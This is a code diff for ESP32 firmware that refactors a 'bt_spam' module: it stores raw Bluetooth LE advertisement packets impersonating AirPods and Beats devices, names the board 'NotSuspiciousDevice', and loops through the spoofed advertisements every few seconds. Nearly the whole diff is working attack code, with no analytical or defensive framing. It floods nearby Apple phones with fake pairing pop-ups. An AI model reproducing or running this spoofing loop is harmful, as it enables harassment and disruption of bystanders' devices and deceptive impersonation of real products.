@@ -1,14 +1,12 @@
-#include <freertos/FreeRTOS.h>
-#include <freertos/task.h>
-
-#include "esp_err.h"
-#include "esp_log.h"
-#include "nvs_flash.h"
-
+#include "bt_spam.h"
 #include "esp_bt.h"
 #include "esp_bt_main.h"
+#include "esp_err.h"
 #include "esp_gap_ble_api.h"
+#include "esp_log.h"
 #include "esp_random.h"
+
+static bt_spam_cb_display display_records_cb = NULL;
 
 static esp_ble_adv_params_t ble_adv_params = {
     .adv_int_min = 0x20,
@@ -19,13 +17,7 @@ static esp_ble_adv_params_t ble_adv_params = {
     .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
 };
 
-static esp_ble_adv_data_t adv_data = {
-    .include_name = true,
-    .flag = ESP_BLE_ADV_FLAG_LIMIT_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT,
-    .appearance = 384,
-};
-
-const uint8_t DEVICES[][31] = {
+const uint8_t long_devices_raw[][31] = {
     // Airpods
     {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
      0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
@@ -96,10 +88,25 @@ const uint8_t DEVICES[][31] = {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 };
 
-const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d,
-                         0x2f, 0x01, 0x06, 0x20, 0xc0};
-
-uint8_t int_buff[1];
+const char* long_names_devices[] = {
+    "Airpods",
+    "Airpods Pro",
+    "Airpods Max",
+    "Airpods Gen 2",
+    "Airpods Gen 3",
+    "Airpods Pro Gen 2",
+    "Power Beats",
+    "Power Beats Pro",
+    "Beats Solo Pro",
+    "Beats Studio Buds",
+    "Beats Flex",
+    "Beats X",
+    "Beats Solo 3",
+    "Beats Studio 3",
+    "Beats Studio Pro",
+    "Betas Fit Pro",
+    "Beats Studio Buds Plus",
+};
 
 static uint8_t adv_raw_data[17] = {
     0x10, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x09, 0x09,
@@ -120,64 +127,49 @@ static void esp_gap_cb(esp_gap_ble_cb_event_t event,
       // esp_ble_gap_start_advertising(&ble_adv_params);
       printf("ESP_GAP_BLE_ADV_START_COMPLETE_EVT\n");
       if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
-        printf("Advertising started\n\n");
+        printf("Advertising started\n");
       } else
-        printf("Unable to start advertising process, error code %d\n\n",
+        printf("Unable to start advertising process, error code %d\n",
                param->scan_start_cmpl.status);
       break;
 
     default:
 
-      printf("Event %d unhandled\n\n", event);
+      printf("Event %d unhandled\n", event);
       break;
   }
 }
 
 static void start_adv() {
   while (true) {
-    esp_ble_gap_start_advertising(&ble_adv_params);
-    vTaskDelay(5000 / portTICK_PERIOD_MS);
-    esp_ble_gap_stop_advertising();
+    for (int i = 0; i < sizeof(long_devices_raw) / 31; i++) {
+      if (display_records_cb) {
+        display_records_cb(long_names_devices[i]);
+      }
+      ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw(
+          &long_devices_raw[i], sizeof(long_devices_raw[i])));
+      esp_ble_gap_start_advertising(&ble_adv_params);
+      vTaskDelay(5000 / portTICK_PERIOD_MS);
+      esp_ble_gap_stop_advertising();
+    }
+    vTaskDelay(1000 / portTICK_PERIOD_MS);
   }
 }
+void bt_spam_register_cb(bt_spam_cb_display callback) {
+  display_records_cb = callback;
+}
 
-void app_main() {
-  printf("BT broadcast\n\n");
-
-  // set components to log only errors
-  esp_log_level_set("*", ESP_LOG_ERROR);
-
-  // initialize nvs
-  ESP_ERROR_CHECK(nvs_flash_init());
-  printf("- NVS init ok\n");
-
-  // release memory reserved for classic BT (not used)
+void bt_spam_app_main() {
   ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
-  printf("- Memory for classic BT released\n");
-
-  // initialize the BT controller with the default config
   esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
   esp_bt_controller_init(&bt_cfg);
-  printf("- BT controller init ok\n");
-
-  // enable the BT controller in BLE mode
   esp_bt_controller_enable(ESP_BT_MODE_BLE);
-  printf("- BT controller enabled in BLE mode\n");
-
-  // initialize Bluedroid library
   esp_bluedroid_init();
   esp_bluedroid_enable();
-  printf("- Bluedroid initialized and enabled\n");
-
-  // register GAP callback function
   ESP_ERROR_CHECK(esp_ble_gap_register_callback(esp_gap_cb));
-  printf("- GAP callback registered\n\n");
-
-  ESP_ERROR_CHECK(esp_ble_gap_set_device_name("Audif"));
+  ESP_ERROR_CHECK(esp_ble_gap_set_device_name("NotSuspiciousDevice"));
   // configure the adv data
   ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw(&adv_raw_data, 17));
-  // ESP_ERROR_CHECK(esp_ble_gap_config_adv_data(&adv_data));
-  printf("- ADV data configured\n\n");
-
+  vTaskDelay(500 / portTICK_PERIOD_MS);
   xTaskCreate(&start_adv, "start_adv", 2048, NULL, 5, NULL);
 }
